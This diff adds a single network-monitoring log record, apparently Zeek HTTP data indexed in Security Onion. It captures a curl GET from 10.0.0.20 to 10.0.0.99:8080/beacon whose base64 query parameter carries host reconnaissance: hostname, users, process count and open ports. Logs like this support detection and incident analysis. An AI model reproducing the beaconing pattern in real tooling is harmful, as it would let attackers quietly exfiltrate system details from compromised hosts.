@@ -1,0 +1,118 @@
+2026-05-04 11:13:02.601 +00:00
+	zeek.http
+	10.0.0.20
+	38274
+	10.0.0.99
+	8080
+	GET
+	10.0.0.99:8080
+	200
+	OK
+	0
+	4
+	CuGe3W1o6gypy3Of69
+	1:2qVtg8t5WOLrEK6lcqv0ha6OGkQ=
+@timestamp
+	2026-05-04T11:13:02.601Z
+client.ip
+	10.0.0.20
+client.port
+	38274
+container.id
+	http.log
+data_stream.dataset
+	zeek
+data_stream.namespace
+	so
+data_stream.type
+	logs
+destination.ip
+	10.0.0.99
+destination.port
+	8080
+ecs.version
+	8.0.0
+elastic_agent.id
+	3cb76ed9-be31-4878-b78b-728f96cba5b0
+elastic_agent.snapshot
+	false
+elastic_agent.version
+	9.0.8
+event.agent_id_status
+	missing
+event.category
+	network
+event.dataset
+	zeek.http
+event.ingested
+	2026-05-04T11:13:16Z
+event.module
+	zeek
+http.method
+	GET
+http.request.body.length
+	0
+http.response.body.length
+	4
+http.status_code
+	200
+http.status_message
+	OK
+http.trans_depth
+	1
+http.uri
+	/beacon?data=SE9TVE5BTUU9YW9tLXVidW50dS1zZXJ2ZXJ8VVNFUj1hb20tdHJhYmFqYWRvcjF8VVNFUlM9cm9vdCxkYWVtb24sYmluLHN5cyxzeW5jLGdhbWVzLG1hbixscCxtYWlsLG5ld3MsdXVjcCxwcm94eSx3d3ctZGF0YSxiYWNrdXAsbGlzdCxpcmMsX2FwdCxub2JvZHksc3lzdGVtZC1uZXR3b3JrLHN5c3RlbWQtdGltZXN5bmMsZGhjcGNkLG1lc3NhZ2VidXMsc3lzdGVtZC1yZXNvbHZlLHBvbGxpbmF0ZSxwb2xraXRkLHN5c2xvZyx1dWlkZCx0Y3BkdW1wLHRzcyxsYW5kc2NhcGUsZnd1cGQtcmVmcmVzaCx1c2JtdXgsYW9tLXVzZXItc2VydmVyLHNzaGQsYW9tLXRyYWJhamFkb3IxLHxQUk9DUz0xNDB8UE9SVFM9MTI3LjAuMC41NDo1MywxMjcuMC4wLjUzJWxvOjUzLDAuMC4wLjA6MjIsWzo6XToyMiwqOjgwLHxUSU1FPU1vbiBNYXkgNCAxMToxMzowMiBBTSBVVEMgMjAyNgo=
+http.useragent
+	curl/8.5.0
+http.version
+	1.0
+http.virtual_host
+	10.0.0.99:8080
+input.type
+	filestream
+log.file.device_id
+	64512
+log.file.inode
+	152845373
+log.file.path
+	/nsm/zeek/logs/current/http.log
+log.id.resp_fuids
+	[
+  "FTikFzmax31csDeB9"
+]
+log.id.uid
+	CuGe3W1o6gypy3Of69
+log.offset
+	2886
+message
+	{"ts":1777893182.601414,"uid":"CuGe3W1o6gypy3Of69","id.orig_h":"10.0.0.20","id.orig_p":38274,"id.resp_h":"10.0.0.99","id.resp_p":8080,"trans_depth":1,"method":"GET","host":"10.0.0.99:8080","uri":"/beacon?data=SE9TVE5BTUU9YW9tLXVidW50dS1zZXJ2ZXJ8VVNFUj1hb20tdHJhYmFqYWRvcjF8VVNFUlM9cm9vdCxkYWVtb24sYmluLHN5cyxzeW5jLGdhbWVzLG1hbixscCxtYWlsLG5ld3MsdXVjcCxwcm94eSx3d3ctZGF0YSxiYWNrdXAsbGlzdCxpcmMsX2FwdCxub2JvZHksc3lzdGVtZC1uZXR3b3JrLHN5c3RlbWQtdGltZXN5bmMsZGhjcGNkLG1lc3NhZ2VidXMsc3lzdGVtZC1yZXNvbHZlLHBvbGxpbmF0ZSxwb2xraXRkLHN5c2xvZyx1dWlkZCx0Y3BkdW1wLHRzcyxsYW5kc2NhcGUsZnd1cGQtcmVmcmVzaCx1c2JtdXgsYW9tLXVzZXItc2VydmVyLHNzaGQsYW9tLXRyYWJhamFkb3IxLHxQUk9DUz0xNDB8UE9SVFM9MTI3LjAuMC41NDo1MywxMjcuMC4wLjUzJWxvOjUzLDAuMC4wLjA6MjIsWzo6XToyMiwqOjgwLHxUSU1FPU1vbiBNYXkgNCAxMToxMzowMiBBTSBVVEMgMjAyNgo=","version":"1.0","user_agent":"curl/8.5.0","request_body_len":0,"response_body_len":4,"status_code":200,"status_msg":"OK","tags":[],"resp_fuids":["FTikFzmax31csDeB9"]}
+network.community_id
+	1:2qVtg8t5WOLrEK6lcqv0ha6OGkQ=
+network.transport
+	tcp
+observer.name
+	aom-onion
+pipeline
+	http
+server.ip
+	10.0.0.99
+server.port
+	8080
+source.ip
+	10.0.0.20
+source.port
+	38274
+tags
+	[
+  "http"
+]
+soc_id
+	YrOx8p0BXO5HNJ7gQWCI
+soc_score
+	11.565221
+soc_type
+	
+soc_timestamp
+	2026-05-04T11:13:02.601Z
+soc_source
+	aom-onion:.ds-logs-zeek-so-2026.05.03-000001
